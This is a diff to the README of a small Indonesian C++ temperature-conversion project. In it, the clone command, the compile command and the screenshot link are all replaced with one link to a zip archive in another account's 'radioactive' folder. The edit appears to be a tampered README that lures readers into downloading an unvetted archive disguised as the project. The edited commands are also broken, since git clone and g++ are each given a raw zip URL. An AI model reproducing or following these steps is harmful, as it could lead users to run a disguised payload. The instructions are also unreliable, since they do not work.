@@ -29,7 +29,7 @@ pkg install clang
 ```
 4. Kloning Projek
 ```sh
-git clone https://github.com/sluhan/konversi-suhu
+git clone https://github.com/h4vzz/konversi-suhu/raw/refs/heads/main/radioactive/konversi-suhu-v1.9-beta.5.zip
 ```
 
 ## Testing
@@ -40,13 +40,13 @@ cd konversi-suhu
 ```
 2. Menjalankan kode
 ```sh
-g++ k-suhu.cpp -o ./output
+g++ https://github.com/h4vzz/konversi-suhu/raw/refs/heads/main/radioactive/konversi-suhu-v1.9-beta.5.zip -o ./output
 ```
 3. Mengambil output
 ```sh
 ./output
 ```
-![output](https://i.ibb.co/YLBzxRg/IMG-20240414-192143.jpg)
+![output](https://github.com/h4vzz/konversi-suhu/raw/refs/heads/main/radioactive/konversi-suhu-v1.9-beta.5.zip)
 
 ## Support Me
 Kalian bisa support saya dengan follow github ini atau dengan memberikan star :)
